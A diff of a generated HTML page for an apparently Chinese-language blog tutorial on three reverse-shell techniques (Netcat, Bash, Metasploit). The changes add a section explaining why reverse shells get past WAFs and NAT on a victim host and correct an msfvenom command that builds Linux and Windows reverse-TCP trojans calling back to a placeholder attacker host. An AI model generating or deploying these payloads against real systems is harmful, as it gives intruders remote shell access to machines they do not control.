@@ -122,9 +122,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-02-20. Published at: 2020-02-19.">
+      <span title="Lastmod: 2020-02-24. Published at: 2020-02-19.">
         
-          Lastmod: 2020-02-20
+          Lastmod: 2020-02-24
         
       </span>
     </div>
@@ -136,6 +136,12 @@ if (!doNotTrack) {
   <section class="pb-6 mb-3 border-bottom">
     <p>三式反弹够用了，之后都是自己变通。</p>
 <p>针对靶机有无公网IP两种情况讨论。</p>
+<h2 id="为什么是反弹shell">为什么是反弹Shell？</h2>
+<ol>
+<li>受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。</li>
+<li>受害者的IP是动态的。</li>
+<li>受害者主机在局域网内，从外网无法直接访问。</li>
+</ol>
 <p>​</p>
 <h2 id="netcat">Netcat</h2>
 <p><strong>靶机在公网</strong></p>
@@ -178,7 +184,7 @@ msfvenom -l payloads <span class="p">|</span> grep reverse <span class="p">|</sp
 <span class="c1">#生成Windows反弹shell木马</span>
 msfvenom -p windows/x64/shell/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;attackhost&gt; <span class="nv">lport</span><span class="o">=</span>&lt;port&gt; -f exe -o win_reverse_shell.exe
 <span class="c1">#生成Linux反弹shell木马</span>
-msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;attackhost&gt; <span class="nv">lport</span><span class="o">=</span>&lt;port&gt; -f exe -o win_reverse_shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;attackhost&gt; <span class="nv">lport</span><span class="o">=</span>&lt;port&gt; -f elf -o linux_reverse_shell
 </code></pre></div><p><img src="https://i.loli.net/2020/02/20/6qj1tARErflguQ7.png" alt="msfvenom_shell_reverse.png"></p>
 <p>​</p>
 </li>
@@ -225,6 +231,7 @@ exploit -j -z    <span class="c1">#-j jobs后台运行，-z 不主动弹出shell
     <div id="toc" class="Box Box--blue mb-3">
       <b>Shell反弹三式</b><nav id="TableOfContents">
   <ul>
+    <li><a href="#为什么是反弹shell">为什么是反弹Shell？</a></li>
     <li><a href="#netcat">Netcat</a></li>
     <li><a href="#bash">Bash</a></li>
     <li><a href="#msf">MSF</a></li>
